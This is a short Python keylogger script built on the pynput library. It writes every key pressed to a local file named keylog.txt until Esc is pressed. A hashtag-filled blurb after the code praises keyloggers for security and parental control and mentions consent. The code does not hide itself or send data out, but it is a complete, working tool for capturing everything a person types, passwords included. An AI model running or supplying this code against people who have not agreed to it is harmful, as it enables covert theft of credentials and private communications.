from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "keylog.txt"

# Function to write to the log file
def write_to_log(key):
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

# Function to handle key press events
def on_press(key):
    write_to_log(key)

# Function to handle key release events
def on_release(key):
    if key == Key.esc:  # Stop listener if Esc key is pressed
        return False
# Start listening for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# 🔒🔍 Keylogging: Striking a Balance Between Security and Privacy 🔍🔒

# In today's digital landscape, keyloggers play a vital role in cybersecurity and parental control. But with great power comes great responsibility. Let's ensure that their use is transparent, with clear consent from all parties involved. It's all about finding that delicate balance between protecting data and respecting privacy. #EthicalTech #PrivacyMatters 🛡️🔐